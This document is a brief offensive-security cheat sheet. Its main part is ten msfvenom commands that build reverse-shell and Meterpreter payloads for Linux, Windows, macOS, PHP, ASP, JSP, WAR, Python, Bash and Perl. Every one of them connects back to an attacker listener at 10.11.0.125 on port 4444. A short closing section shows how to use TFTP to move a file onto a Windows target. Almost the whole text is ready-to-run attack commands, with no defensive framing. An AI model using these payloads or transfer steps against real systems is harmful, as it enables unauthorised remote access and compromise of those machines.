## MSFVenom Payloads

**Linux**
>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.0.125 LPORT=4444 -f elf > shell.elf

**Windows**
>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.125 LPORT=4444 -f exe > shell.exe

**Mac**
>msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.11.0.125 LPORT=4444 -f macho > shell.macho 

**PHP**
>msfvenom -p php/meterpreter_reverse_tcp LHOST=10.11.0.125 LPORT=4444 -f raw > shell.php

**ASP**
>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.125 LPORT=4444 -f asp > shell.asp

**JSP**
>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.125 LPORT=4444 -f raw > shell.jsp

**WAR**
>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.125 LPORT=4444 -f war > shell.war 

**Python**
>msfvenom -p cmd/unix/reverse_python LHOST=10.11.0.125 LPORT=4444 -f raw > shell.py

**Bash**
>msfvenom -p cmd/unix/reverse_bash LHOST=10.11.0.125 LPORT=4444 -f raw > shell.sh

**Perl**
>msfvenom -p cmd/unix/reverse_perl LHOST=10.11.0.125 LPORT=4444 -f raw > shell.pl 


## File Transfers

**tftp**

Installed on Windows XP up to 2003 by default

>mkdir /tftp

>aftpd --daemon --port 69 /tftp

>cp /file/you/want /tftp

On Windows 
>tftp -i --yourIP-- get file.exe